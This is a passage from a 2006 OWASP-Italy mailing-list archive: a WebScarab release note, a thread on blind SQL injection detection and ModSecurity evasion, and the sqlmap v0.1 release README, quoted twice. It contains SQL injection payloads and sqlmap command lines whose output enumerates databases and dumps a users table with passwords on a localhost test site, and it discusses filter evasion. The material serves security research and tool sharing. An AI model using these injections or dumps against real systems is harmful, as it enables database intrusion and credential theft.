in the associated Changelog. I'll summarise the more interesting ones here:

BugFixes
========

The Parsed Request Editor would corrupt headers/parameters where the
name contained url-encoded characters. We would url-decode the name to
show it in the more user-friendly manner, but we didn't reencode it
before sending it to the server.

Enhancements
============

WebScarab now has a logo! ;-) Thanks to Andrew van der Stock and Larry
Casey for their assistance in getting this done.

Probably the most visible change is a new Memory utilisation widget that
runs across the bottom of the UI. This allows users to monitor their
memory utilisation, and save their session prior to running out of
memory. It will also change color from green to yellow to red when one
approaches the limit. (Yes, I know WebScarab has some pretty serious
memory leaks)

There is a new Lite version of WebScarab, which only shows the Summary
page, and the Proxy Intercept tab. Some folks have commented that
WebScarab is intimidating to new users, with all the options. This
interface is intended to address those concerns. Note that it is not the
default, and needs to be invoked as "java -jar webscarab.jar Lite", in
order to be activated.

A related change is a hidden option to discard any conversations where
the URL matches a user-supplied regular expression. Again, for new
users, things like images, javascripts(?), Cascading Style Sheets, etc
simply clutter the the summary, and are confusing. By adding a property
to the webscarab.properties file in the user.home directory, one can
enable this feature. For example:

WebScarab.dropRegex=.*\\.(gif|jpg|png|css)$

There is a hidden option to change the layout of the Conversation
windows. Previously I polled list members to get their preferences,
either Request above Response, or Request next to Response. I got
support for both variations, so I implemented a hot-key to switch
between them, namely Ctrl-T.

The underlying HTTP engine has been reworked to support authentication
internally, rather than punting and letting the browser handle it.
WebScarab now maintains a set of credentials, and uses them
automatically when appropriate. This means that WebScarab can now
support NTLM-authentication, thanks to code taken from the jCIFS project.

The Summary now defaults to sorting in reverse. This means that the most
recent conversations appear at the top of the table, instead of at the
bottom. It is easy to change this (non-permanently, unfortunately), by
clicking on the column headers to choose your preferred sort order.

The Text Pane in the conversation view now has reworked Search
capabilities. Now if you press Ctrl-F, you get a FireFox-like search
bar, that highlights all matches for your search as you type it. Most
interestingly, it also supports regular expressions, which means that
you can find an unknown piece of text between two known parts. It will
also automatically scroll the text pane to show the first match if it is
not on screen. This is best used with a regex group that matches the
text that you are interested in, as only the matching group/s will be
highlighted.

SSL Client Certificate management has also been reworked. WebScarab now
supports using SSL Client certificates from PKCS#11 devices (please let
me know if you have any trouble with this), as well as from PKCS#12 files.

The HttpUrl class has been reworked to not accept whitespace in URL's.
This was important, because parsing malformed HTML might result in
corruption of the user's session, preventing later reloading of the session.

Some minor tweaks were made to the HTML pane, so that images would not
be shown. Previously, images would be loaded from the originating
server, if the HTML included a BASE parameter, or if the URL was absolute.

Manual Intercept:

The buttons have been moved around a bit, to make them a bit more
obvious/intuitive, hopefully.

Plugins
=======

Spider plugin:

Now understands relative paths in Location headers. (I don't think this
is according to the spec, but it is common enough to ned

SessionID Plugin:

You can now clear a list of sessionids, if you want to take a
new/different sample.

You can also export the currently selected samples, for external
manipulation in e.g. a spreadsheet, etc.

It is also possible to extract more than one piece of a sessionid at one
time, by using multiple groups. The previous behaviour was simply to
concatenate each of the matching groups into one long string, and
analyse that. Now we capture the original session id, as well as new
sessionids that are made up only of the matching groups. In other words,
you might expect to see "localhost/ JSESSIONID", "localhost/ JSESSIONID
1", "localhost/ JSESSIONID 2", etc, if you used a regular expression
like ..(....)..(....)..* to capture characters 3-6 and 9-12.

There are also statistics reported from the calculated values, showing
the smallest value, the largest value, and the scale of the numbers in
scientific notation.

Extension Checking:

There is a new plugin, contributed by Meder Kydyraliev, which allows the
operator to selectively check URL's for variants by adding an extension.
For example, by adding .bak, .old, ~, etc, one may be able to find older
versions of pages that would not be executed on the server, but returned
in clear to the browser. You can also check directories for archives
from which they might have been created. e.g. myapp/ might become
myapp.zip, myapp.tar, myapp.tar.gz, etc.

Fuzzer plugin:

The fuzzer plugin now has a table of conversations collected during the
most recent run. You view the conversation details by double-clicking on
a row, as one would expect, and step forward and backwards through the
table. This makes it a lot easier to review the results.

The fuzzer now supports a new type of fuzz source, generated from a
reduced regular expression. By reduced, I mean that you can't use . (any
character), and * (variable numbers of characters). However, you can use
ranges [A-Z], counts {3}, etc. WebScarab will then generate a list of
all strings that match the regular expression.

As always feedback is welcome, preferably on the owasp-webscarab list at
lists.sourceforge.net.

Thanks

Rogan

-------------------------------------------------------------------------
Sponsored by: Watchfire

Cross-Site Scripting (CSS) is one of the most common application-level
attacks that hackers use to sneak into web applications today. This
whitepaper will discuss how traditional CSS attacks are performed, how to
secure your site against these attacks and check if your site is protected.
Cross-Site Srcipting Explained - Download this whitepaper today!

https://www.watchfire.com/securearea/whitepapers.aspx?id=701300000007tAL
--------------------------------------------------------------------------



-- 
Matteo Meucci
OWASP-Italy Chair, CISSP
site: http://www.owasp.org/index.php/Italy
mail: matteo.meucci at owasp.org
ml: https://lists.sourceforge.net/lists/listinfo/owasp-italy



From lterenz at gmail.com  Thu Jun 29 14:25:57 2006
From: lterenz at gmail.com (Luca Terenziani)
Date: Thu, 29 Jun 2006 20:25:57 +0200
Subject: [Owasp-italy] Blind SQL Injection e falsi positivi
In-Reply-To: <449AE7C2.60303@fastwebnet.it>
References: <5c51638d0606221025j707853edkf59b2f1dbae19bd2@mail.gmail.com>
	<449AE7C2.60303@fastwebnet.it>
Message-ID: <5c51638d0606291125g57d661ccw53367557701b9e76@mail.gmail.com>

> per quanto riguarda la prima domanda, la maggior parte dei tool di
> vulnerability assessment ci? che fa ? semplicemente verificare se
> l'applicazione ? vulnerabile facendo un semplice patter matching
> dell'HTML ottenuto ? controllano se vi ? la presenza di stringhe di
> errore tipo "ODBC Error" o roba simile. O almeno questo ? cio che fa
> Acunetix (ma penso anchi gli altri tool), infatti il suo test sull'SQL
> Injection si limita ad inviare i valori ' e %25 (mi sembra) e
> controllare l'output.

quindi non becca Blind SQL Injection, dico bene?

> Nel caso di Blind SQL Injection (in cui gli errori non sono rilevati),
> al blackhat 2004 il gruppo hacker 0x90 ha presentato una ricerca proprio
> su tale argomento, se ti interessa ti posto il riferimento:
> http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-hotchkies/bh-us-04-hotchkies.pdf

si la presentazione e` bella, pero` non ho capito:
1) come vengono letti tali grafici (cosa rappresentano i valori sulle
ordinate, ascisse .. e sopratutto: cosa e` "Hoogle")
2) come funzionani gli algoritmi di matching, su cosa si basano ... e
qual'e` il problema a cui si incorre confrontando gli md5

> A occhio e croce dovresti avere un qualcosa che controlla tutte le
> richieste HTTP ed effettua un backslah dei caratteri ', ma ci? non
> basta, infatti nel caso l'imput ? un numero, non ho bisogno di inserire
> il carattere '.
> Diciamo che ? una questione alquanto spinosa :D
> Se ti interessa per Apache puoi provare modesecurity
> (http://www.modsecurity.org).

Ma esistono tecniche di "Signature Evasion" per modsecurity?


> Spero di esserti stato d'aituo, ciao
grazie!!!



From antoniomassimo.parata at fastwebnet.it  Thu Jun 29 15:48:14 2006
From: antoniomassimo.parata at fastwebnet.it (antonio "s4tan" parata)
Date: Thu, 29 Jun 2006 21:48:14 +0200
Subject: [Owasp-italy] Blind SQL Injection e falsi positivi
In-Reply-To: <5c51638d0606291125g57d661ccw53367557701b9e76@mail.gmail.com>
References: <5c51638d0606221025j707853edkf59b2f1dbae19bd2@mail.gmail.com>	
	<449AE7C2.60303@fastwebnet.it>
	<5c51638d0606291125g57d661ccw53367557701b9e76@mail.gmail.com>
Message-ID: <44A42E7E.5000203@fastwebnet.it>

Alura,
>
> quindi non becca Blind SQL Injection, dico bene?
>
secondo me no, poi chiss?...
> si la presentazione e` bella, pero` non ho capito:
> 1) come vengono letti tali grafici (cosa rappresentano i valori sulle
> ordinate, ascisse .. e sopratutto: cosa e` "Hoogle")
In questo caso, ci? che gli autori tentano di fare ?, prendono le due 
pagine da confrontare, ne calcolano l'hash MD5, se l'hash risulta uguale 
allora le pagine sono uguali, altrimenti no.
In particolare si chiedono (da quanto ho capito) se dei piccoli 
cambiamenti nell'hash risultano in piccoli cambiamenti nella pagina. Per 
come sono state progettate le funzioni di hash, a piccoli cambiamenti 
nella stringa vi e' una modifica dei valori dell'hash di circa il 50%. 
Cio' vuol dire che semplicemente guardando come cambia l'hash non posso 
dire un bel niente su come cambia la pagina.
In seguito fanno un esempio tra due parole molto simili, ovvero "google" 
e "hoogle". Si nota come l'hash delle due stringhe sia completamente 
diverso, il grafo va letto nel seguente modo: sulle ascisse vi sono i 
singoli caratteri dell'hash (l'MD5 e' formato da 32 caratteri, per cui i 
punti evidenziati con una * sono 32) e sulle ordinate vi sono i valori 
che ogni carattere puo' assumere (essendo una codifica esadecimale va da 
0 a 16).
> 2) come funzionani gli algoritmi di matching, su cosa si basano ... e
> qual'e` il problema a cui si incorre confrontando gli md5
MD5 dovrei aver risposto sopra (ovvero a fronte di piccoli cambiamenti 
succede un casino :), per quanto riguarda il matching da cio' che ho 
capito (certo che potevano mettere qualche commento in piu' nelle slide 
:) cio' che fanno e' effettuare una serie di richieste diverse nel 
formato dell'url ma uguali nel significato. Ovvero effettuano delle 
richieste che dovrebbero dare lo stesso risultato del tipo:

...?id=2' or '1' = '1
...?id=2' or '2' = '2

poi controllano le due pagine ed eliminano cio' che vi e' di diverso 
(tramite un filtro adattativo), in questo modo ottengono un modello di 
risposta. In seguito controllano questo modello con le varie richieste 
dovute al testing sull'inferenza per decidere sul risultato dell'operazione.
>
> Ma esistono tecniche di "Signature Evasion" per modsecurity?
Modsecurity da la possibilita' di impostare delle proprie regole di 
filtraggio tramite espressioni regolari. Per cui tanto piu' buone sono 
tali regole tanto piu' difficile e' evaderle. Credo che ci siano gia' 
dentro delle regole di default, ma sinceramente non so' dirti se 
esistono particolare tecniche di evasione (un articolo su come scrivere 
tali espressioni regolare lo puoi trovare su 
http://www.securityfocus.com/infocus/1768).

<nota personale>
sinceramente non credo che le tecniche basate su signature funzionino in 
questo caso, SQL e' un linguaggio troppo ricco per includere tutte le 
possibili firme e pur riuscendoci otterresti una lista talmente lunga 
che sarebbe pesantissima da analizzare.
Se ti interessa sul signature evasion un'introduzione e' 
http://www.imperva.com/application_defense_center/white_papers/sql_injection_signatures_evasion.html
</nota personale>

Spero di averti risposto (anche se in modo un po' troppo prolisso).
> grazie!!!
Ma figurati :)




From daniele.bellucci at gmail.com  Fri Jun 30 12:43:50 2006
From: daniele.bellucci at gmail.com (Daniele Bellucci)
Date: Fri, 30 Jun 2006 18:43:50 +0200
Subject: [Owasp-italy] MySQL Injector
Message-ID: <a1ad6c700606300943i67ae5d8dgdfa6b23ac0407976@mail.gmail.com>

Visto che siamo in argomento vi rimando alla lettura del mio blog:
http://www.linux.it/~belch/?p=16 anziche' invarvi un messaggio
gigantesco da diversi mega.

Consiglio la lettura anche a chi vuol approfondire le tecniche di
enumerazione attraverso Blind SQL Injection su MYSQL.

Per varie ed evantuali ......

L'idea sarebbe, se qualcuno mi da una mano di sviluppare un
equivalente di "nmap" per SQL Injection che consenta di enumerare
interi DB (database, tabelle, colonne, valori etc .etc.)



From daniele.bellucci at gmail.com  Fri Jun 30 20:56:07 2006
From: daniele.bellucci at gmail.com (Daniele Bellucci)
Date: Sat, 01 Jul 2006 02:56:07 +0200
Subject: [Owasp-italy] sqlmap v0.0.1
Message-ID: <44A5C827.8070307@gmail.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Ciao a tutti,

sono lieto/felice di presentarvi sqlmap un tool per (Automatic Blind SQL
Injection su variabili GET con valori numerici[AL MOMENTO!!!!]).

Spero di non annoiarvi con questa lunga mail, ma ho pensato (dopo la
lunga fatica) di riportare il README contenuto all'interno del tgz per
meglio spiegare di cosa si tratta.

Mi piacerebbe che si riesce a porta il tool come progetto owasp.


L'idea e` quella di cui vi accennavo, ossia: costruire un tool che sia
un "nmap" per sqlinjection e che consenta di enumerare quanto piu`
possibile su DBMS differenti (al momento soltanto MySQL e` supportato)
Un tool che raccolga tutte le tecniche di SQLInjection conosciute,
che faccia ad esempio DBMS Fingerprinting senza fare affidamento al
banner recuperato etc. etc.

Accetto molto ma molto ma molto ma molto ben volentieri proposto,
suggerimenti, consigli .. e perche` no, pure qualche insulto ;)

Qui trovato il link per scaricare:
http://www.linux.it/~belch/?p=17

il sito di riferimento sara` appunto il mio blog ..


'notte a tutti

belch.




- -----------------------------------------------------------------------



    sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>


usage: sqlmap.py [options]

options:
  -h, --help           show this help message and exit
  -u URL               http/https url
  -t URL_TOKEN         token to replace in url
  -f HEADER_FILE_NAME  load http header from file
  -d DEFAULT_VALUE     default value for token
  -e EXPRESSION        expression to evaluate
  --database=DB        DB to enumerate
  --table=TABLE        table to enumerate
  --get-dbs            get available DBs
  --get-tables         get available tables
  --get-attributes     get table columns (require: -T optional: -D)
  --current-database   get current db
  --current-user       get current user
  --dump               dump a DB table (require: -T optional: -D)
  --banner             get DBMS banner/version
  -v                   be verbose



CARATTERISTICHE:

[*] al momento solo MySQL e` supportato
[*] possibilita` di utilizzo di header HTTP "raw"
[*] enumerazione di tutti i DBs presenti
[*] enumerazione di tutte le tabelle presenti
    o di tutte le tabelle associate ad un
    determinato DB
[*] enumerazione degli attributi di una tabella
    associata ad un DB oppure al DB corrente
[*] enumerazione del DB corrent
[*] dump formattato di un intera tabella associata ad un DB
    oppure ad al corrente DB
[*] enumerazione della versione corrente MySQL
[*] recupero dell'utente di sistema con il quale e` effettuata
    la connessione al DB
[*] algoritmo di enumerazione lineare [O(n)] sul numero di bit
    della rappresentazione
[*] evasione dal "magic quote" tramite codifica della stringa
    con l'operatore CHAR(x,y,z,k)
[*] esecuzione di uno statement SQL "raw" e recupero del
    risultato

Le informazioni vengono 'prelevate' da "INFORMATION_SCHEMA"
e quindi saranno enumerate soltanto tabella/dbs per i quali
l'utente utilizzato dalla webapp per la connessione al db
ha il 'grant'

ESEMPI:

Supponiamo di aver determinato che il nostro sito e` vulnerabile
ad un SQL Injection tramite un qualche meccanismo di fuzzing
o di "time delaying" e supponiamo che l'URL vulnerabile sia:

http://localhost/blind/showcontent.php?id=1&cat=2

e supponiamo di aver scoperto che:
http://localhost/blind/showcontent.php?id=1%20AND%201=1&cat=2
restituisce al nostro browser la stessa identica pagina di prima.

A questo punto possiamo effettuare SQL Injections andando a manipolare
la variabile GET: "id" ed utilizzando sqlmap.

Nel caso specifico i parametri fondamentali sono:
- -u http://localhost/blind/showcontent.php?id=TOKEN&cat=2
- -t TOKEN
- -d 1

Questo perche` sqlmap determina quali parametri "fuzzare" specificando
un TOKEN ed il suo valore di default, ovvero il valore che consente
di visualizzare correttamente la pagina.


Il confronto tra la pagina generata con il "fuzzing" e la pagina di partenza
viene effettuato tramite comparazione degli hash (MD5) delle due pagine.
Cameron Hotchkies, in uno speech svolto al Blackhat qualche tempo fa ha
fatto
notare che questa tecnica di "comparazione" non e` di certo la migliore
in quanto
l'MD5 non ha memoria, ovvero perturbando qualche bit del dato di input
si ottiene
un hash completamente differente.


- --BANNER GRABBING:
[503] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
"http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
- --banner

    sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>


[*] starting at: 02:00:26
banner: '5.0.22-Debian_0ubuntu6.06-log'

[*] shutting down at: 02:00:27


- --CURRENT USER:
[505] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
"http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
- --current-user
    sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>


[*] starting at: 02:01:01
current user:   'belch at localhost'

[*] shutting down at: 02:01:01


- --CURRENT DATABASE
[506] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
"http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
- --current-database

    sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>


[*] starting at: 02:01:28
current database:       'blind'

[*] shutting down at: 02:01:28


- --DB PRESENTI
[509] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
"http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
- --get-db
    sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>


[*] starting at: 02:02:22available database:

[*] information_schema
[*] blind
[*] mysql
[*] test

[*] shutting down at: 02:02:25



- --DUMP DI UNA TABELLA

Vediamo ora un esempio concreto che mostra come effettuare il dump di
tutte le tabelle
del database 'blind':

Come prima cosa, procuriamoci la lista delle tabelle:
[510] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
"http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
- --database blind --get-tables

    sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>


[*] starting at: 02:03:20
- -----------------------------
DATABASE: blind
- -----------------------------
news
users
- -----------------------------


[*] shutting down at: 02:03:21


Iniziamo dalla tabella news:
[511] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
"http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
- --database blind --table news --dump

    sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>


[*] starting at: 02:03:41
DATABASE: blind TABLE: news
-
-------------------------------------------------------------------------------------------------
|news                             |id
|highlight
-
-------------------------------------------------------------------------------------------------
|ciao da daniele                  |1
|numero 1
|sempre ciao da daniele           |2
|numero 2
|sempre sempre ciao da daniele    |3
|numero 3
-
-------------------------------------------------------------------------------------------------


[*] shutting down at: 02:03:47


passiamo ora alla tabella users:
[512] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
"http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
- --database blind --table users --dump

    sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>


[*] starting at: 02:04:05
DATABASE: blind TABLE: users
- -------------------------------------
|username     |password     |id
- -------------------------------------
|daniele      |bellucci     |1
|mancinelli   |mancio       |2
- -------------------------------------

[*] shutting down at: 02:04:08


- --ESECUZIONE SINGOLI STATEMENT:
[518] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
"http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
- -e "select version()"

    sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>


[*] starting at: 02:06:15
select version():       '5.0.22-Debian_0ubuntu6.06-log'

None
[*] shutting down at: 02:06:16

TODO:
[*] sostituire il confronto degli Hash con un algoritmo di
    confronto euristico
[*] aggiungere classi per gli altri DBMS(Oracle, SQL Server, Postgres)
[*] aggiungere supporto proxy http
[*] aggiungere supporto HTTP POST
[*] aggiungere supporto per "DBMS Fingerprinting" che non utilizzi
    il banner (recuperato o tramite variabile ODBC @@version, o
    funzioni analoghe) come fattore discriminante ma bensi`
    funzioni e caratterestiche indicative di un DBMS
[*] poiche` i dati SQL sono identificati da parole di dizionario
    (qualcuno di voi ha mai visto una tabella chiamata: h4g1ha8qwu123 ?!?)
    i dati enumerati per i nomi degli schemi/tabelle andrebbero memorizzati
    su un backstore (sqlite?!?) al fine di poter implementare anche
    attacchi di tipo: "dictionary based"


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2.2 (GNU/Linux)

iD4DBQFEpcgm09kcuJoOgZARAly/AJQOTneVrolLLoq/3PBdgXAioKZqAKCApSW0
cMHgmUfqm66gH18SW4L3HA==
=vGcf
-----END PGP SIGNATURE-----



From matteo.meucci at owasp.org  Fri Jun 30 19:05:24 2006
From: matteo.meucci at owasp.org (Matteo Meucci)
Date: Fri, 30 Jun 2006 19:05:24 -0400 (EDT)
Subject: [Owasp-italy] sqlmap v0.0.1
In-Reply-To: <44A5C827.8070307@gmail.com>
References: <44A5C827.8070307@gmail.com>
Message-ID: <1166.151.26.194.218.1151708724.squirrel@mail.owasp.org>

Ciao Daniele,
molto interessante il tuo tool. Direi che per il momento possiamo
pubblicarlo sul nostro sito OWASP-Italy e poi chiss?...

Ne approfitto per ringraziare Alberto (icesurfer) per l'ottimo seminario
che abbiamo tenuto ad InfoSecurity in cui, tra le altre cose ha presentato
il suo favoloso SqlNinja!
Vorrei replicare un evento del genere e riuscire a coinvolgere sempre pi?
membri di OWASP-Italy, magari facendo mostrare a ciascuno le proprie
specialit? o tool sviluppati...che ne pensate?

Buon week end,
Mat



> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> Ciao a tutti,
>
> sono lieto/felice di presentarvi sqlmap un tool per (Automatic Blind SQL
> Injection su variabili GET con valori numerici[AL MOMENTO!!!!]).
>
> Spero di non annoiarvi con questa lunga mail, ma ho pensato (dopo la
> lunga fatica) di riportare il README contenuto all'interno del tgz per
> meglio spiegare di cosa si tratta.
>
> Mi piacerebbe che si riesce a porta il tool come progetto owasp.
>
>
> L'idea e` quella di cui vi accennavo, ossia: costruire un tool che sia
> un "nmap" per sqlinjection e che consenta di enumerare quanto piu`
> possibile su DBMS differenti (al momento soltanto MySQL e` supportato)
> Un tool che raccolga tutte le tecniche di SQLInjection conosciute,
> che faccia ad esempio DBMS Fingerprinting senza fare affidamento al
> banner recuperato etc. etc.
>
> Accetto molto ma molto ma molto ma molto ben volentieri proposto,
> suggerimenti, consigli .. e perche` no, pure qualche insulto ;)
>
> Qui trovato il link per scaricare:
> http://www.linux.it/~belch/?p=17
>
> il sito di riferimento sara` appunto il mio blog ..
>
>
> 'notte a tutti
>
> belch.
>
>
>
>
> - -----------------------------------------------------------------------
>
>
>
>     sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>
>
>
> usage: sqlmap.py [options]
>
> options:
>   -h, --help           show this help message and exit
>   -u URL               http/https url
>   -t URL_TOKEN         token to replace in url
>   -f HEADER_FILE_NAME  load http header from file
>   -d DEFAULT_VALUE     default value for token
>   -e EXPRESSION        expression to evaluate
>   --database=DB        DB to enumerate
>   --table=TABLE        table to enumerate
>   --get-dbs            get available DBs
>   --get-tables         get available tables
>   --get-attributes     get table columns (require: -T optional: -D)
>   --current-database   get current db
>   --current-user       get current user
>   --dump               dump a DB table (require: -T optional: -D)
>   --banner             get DBMS banner/version
>   -v                   be verbose
>
>
>
> CARATTERISTICHE:
>
> [*] al momento solo MySQL e` supportato
> [*] possibilita` di utilizzo di header HTTP "raw"
> [*] enumerazione di tutti i DBs presenti
> [*] enumerazione di tutte le tabelle presenti
>     o di tutte le tabelle associate ad un
>     determinato DB
> [*] enumerazione degli attributi di una tabella
>     associata ad un DB oppure al DB corrente
> [*] enumerazione del DB corrent
> [*] dump formattato di un intera tabella associata ad un DB
>     oppure ad al corrente DB
> [*] enumerazione della versione corrente MySQL
> [*] recupero dell'utente di sistema con il quale e` effettuata
>     la connessione al DB
> [*] algoritmo di enumerazione lineare [O(n)] sul numero di bit
>     della rappresentazione
> [*] evasione dal "magic quote" tramite codifica della stringa
>     con l'operatore CHAR(x,y,z,k)
> [*] esecuzione di uno statement SQL "raw" e recupero del
>     risultato
>
> Le informazioni vengono 'prelevate' da "INFORMATION_SCHEMA"
> e quindi saranno enumerate soltanto tabella/dbs per i quali
> l'utente utilizzato dalla webapp per la connessione al db
> ha il 'grant'
>
> ESEMPI:
>
> Supponiamo di aver determinato che il nostro sito e` vulnerabile
> ad un SQL Injection tramite un qualche meccanismo di fuzzing
> o di "time delaying" e supponiamo che l'URL vulnerabile sia:
>
> http://localhost/blind/showcontent.php?id=1&cat=2
>
> e supponiamo di aver scoperto che:
> http://localhost/blind/showcontent.php?id=1%20AND%201=1&cat=2
> restituisce al nostro browser la stessa identica pagina di prima.
>
> A questo punto possiamo effettuare SQL Injections andando a manipolare
> la variabile GET: "id" ed utilizzando sqlmap.
>
> Nel caso specifico i parametri fondamentali sono:
> - -u http://localhost/blind/showcontent.php?id=TOKEN&cat=2
> - -t TOKEN
> - -d 1
>
> Questo perche` sqlmap determina quali parametri "fuzzare" specificando
> un TOKEN ed il suo valore di default, ovvero il valore che consente
> di visualizzare correttamente la pagina.
>
>
> Il confronto tra la pagina generata con il "fuzzing" e la pagina di
> partenza
> viene effettuato tramite comparazione degli hash (MD5) delle due pagine.
> Cameron Hotchkies, in uno speech svolto al Blackhat qualche tempo fa ha
> fatto
> notare che questa tecnica di "comparazione" non e` di certo la migliore
> in quanto
> l'MD5 non ha memoria, ovvero perturbando qualche bit del dato di input
> si ottiene
> un hash completamente differente.
>
>
> - --BANNER GRABBING:
> [503] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
> "http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
> - --banner
>
>     sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>
>
>
> [*] starting at: 02:00:26
> banner: '5.0.22-Debian_0ubuntu6.06-log'
>
> [*] shutting down at: 02:00:27
>
>
> - --CURRENT USER:
> [505] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
> "http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
> - --current-user
>     sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>
>
>
> [*] starting at: 02:01:01
> current user:   'belch at localhost'
>
> [*] shutting down at: 02:01:01
>
>
> - --CURRENT DATABASE
> [506] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
> "http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
> - --current-database
>
>     sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>
>
>
> [*] starting at: 02:01:28
> current database:       'blind'
>
> [*] shutting down at: 02:01:28
>
>
> - --DB PRESENTI
> [509] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
> "http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
> - --get-db
>     sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>
>
>
> [*] starting at: 02:02:22available database:
>
> [*] information_schema
> [*] blind
> [*] mysql
> [*] test
>
> [*] shutting down at: 02:02:25
>
>
>
> - --DUMP DI UNA TABELLA
>
> Vediamo ora un esempio concreto che mostra come effettuare il dump di
> tutte le tabelle
> del database 'blind':
>
> Come prima cosa, procuriamoci la lista delle tabelle:
> [510] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
> "http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
> - --database blind --get-tables
>
>     sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>
>
>
> [*] starting at: 02:03:20
> - -----------------------------
> DATABASE: blind
> - -----------------------------
> news
> users
> - -----------------------------
>
>
> [*] shutting down at: 02:03:21
>
>
> Iniziamo dalla tabella news:
> [511] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
> "http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
> - --database blind --table news --dump
>
>     sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>
>
>
> [*] starting at: 02:03:41
> DATABASE: blind TABLE: news
> -
> -------------------------------------------------------------------------------------------------
> |news                             |id
> |highlight
> -
> -------------------------------------------------------------------------------------------------
> |ciao da daniele                  |1
> |numero 1
> |sempre ciao da daniele           |2
> |numero 2
> |sempre sempre ciao da daniele    |3
> |numero 3
> -
> -------------------------------------------------------------------------------------------------
>
>
> [*] shutting down at: 02:03:47
>
>
> passiamo ora alla tabella users:
> [512] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
> "http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
> - --database blind --table users --dump
>
>     sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>
>
>
> [*] starting at: 02:04:05
> DATABASE: blind TABLE: users
> - -------------------------------------
> |username     |password     |id
> - -------------------------------------
> |daniele      |bellucci     |1
> |mancinelli   |mancio       |2
> - -------------------------------------
>
> [*] shutting down at: 02:04:08
>
>
> - --ESECUZIONE SINGOLI STATEMENT:
> [518] belch at wild:sqlmap/ => python2.4 ./sqlmap.py -u
> "http://localhost/blind/showcontent.php?id=TOKEN&c\at=2" -t TOKEN -d 1
> - -e "select version()"
>
>     sqlmap() v0.1 coded by belch <daniele.bellucci at gmail.com>
>
>
> [*] starting at: 02:06:15
> select version():       '5.0.22-Debian_0ubuntu6.06-log'
>
> None
> [*] shutting down at: 02:06:16
>
> TODO:
> [*] sostituire il confronto degli Hash con un algoritmo di
>     confronto euristico
> [*] aggiungere classi per gli altri DBMS(Oracle, SQL Server, Postgres)
> [*] aggiungere supporto proxy http
> [*] aggiungere supporto HTTP POST
> [*] aggiungere supporto per "DBMS Fingerprinting" che non utilizzi
>     il banner (recuperato o tramite variabile ODBC @@version, o
>     funzioni analoghe) come fattore discriminante ma bensi`
>     funzioni e caratterestiche indicative di un DBMS
> [*] poiche` i dati SQL sono identificati da parole di dizionario
>     (qualcuno di voi ha mai visto una tabella chiamata: h4g1ha8qwu123 ?!?)
>     i dati enumerati per i nomi degli schemi/tabelle andrebbero
> memorizzati
>     su un backstore (sqlite?!?) al fine di poter implementare anche
>     attacchi di tipo: "dictionary based"
>
>
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.4.2.2 (GNU/Linux)
>
> iD4DBQFEpcgm09kcuJoOgZARAly/AJQOTneVrolLLoq/3PBdgXAioKZqAKCApSW0
> cMHgmUfqm66gH18SW4L3HA==
> =vGcf
> -----END PGP SIGNATURE-----
>
> Using Tomcat but need to do more? Need to support web services, security?
> Get stuff done quickly with pre-integrated technology to make your job
> easier
> Download IBM WebSphere Application Server v.1.0.1 based on Apache Geronimo
> http://sel.as-us.falkag.net/sel?cmd=lnk&kid=120709&bid=263057&dat=121642
> _______________________________________________
> Owasp-Italy mailing list
> Owasp-Italy at lists.sourceforge.net
> https://lists.sourceforge.net/lists/listinfo/owasp-italy
>





